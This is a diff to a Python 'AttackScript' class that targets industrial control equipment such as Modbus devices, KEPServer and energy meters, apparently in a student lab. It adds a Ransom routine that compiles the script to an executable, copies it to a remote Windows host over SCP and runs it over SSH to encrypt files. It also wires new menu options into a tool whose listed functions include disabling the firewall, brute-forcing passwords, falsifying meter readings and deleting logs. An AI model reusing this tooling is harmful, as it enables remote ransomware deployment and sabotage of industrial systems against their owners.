@@ -388,6 +388,15 @@ class AttackScript:
             print(disableCOM)
             raise Exception(f"Device not {enable_or_disable.split('-')[0][1:]}d. \nFail.\n")
         
+    def Ransom(self) -> None:
+
+        output = self.transfer_exe_remotely("C:\\Users\\Student\\Documents\\")
+        print(output)
+        executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
+
+        run_exe = self.ssh_run_command("C:\\Users\\Student\\Documents\\" + executable_name + " 30")
+        print(run_exe)
+        
 
     def encrypt_files(self) -> None:
         # public key
@@ -1702,8 +1711,9 @@ class AttackScript:
         Args:
             remote_path (str): the remote path to send the exe. (Does NOT include the filename) By default uses the modpoll path
         """
-        compiled_exe_output = run(["pyinstaller", "-F", "--onefile", path.basename(__file__)], stdout=PIPE)
         executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
+        compiled_exe_output = run(["pyinstaller", "--name" , executable_name, "-F", "--onefile", path.basename(__file__)], stdout=PIPE)
+        print(compiled_exe_output)
 
         if remote_path is None:
             remote_path = self.MODPOLL_PATH
@@ -1711,8 +1721,10 @@ class AttackScript:
 
         remote_full_path = path.join(remote_path, executable_name).replace("\\", "/")
 
+        local_full_path = path.join("dist", executable_name)
+
         print(f"Path name is {remote_path}\\{executable_name}")
-        self.scp_transfer_file(f"dist/{executable_name}", remote_full_path)
+        self.scp_transfer_file(local_full_path, remote_full_path)
 
         # print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
 
@@ -1884,9 +1896,6 @@ class AttackScript:
         command_replace_zero = self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace '0', '1' | Set-Content -Path \"{command_output[:-1]}\"")
         print("Replaced 0 with 1")
 
-    def Ransom(self):
-        return True
-
     ########
     # MAIN #
     ########
@@ -1934,6 +1943,8 @@ class AttackScript:
             case "27": self.setup_ssh_config_and_key()  # Move this up to be with the other ssh functions
             case "28": self.kep_delete_log_files()
             case "29": self.kep_get_log_group("Derrick")
+            case "30": self.encrypt_files()
+            case "31": self.Ransom()
             case "-h":
                 print(
                     "\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
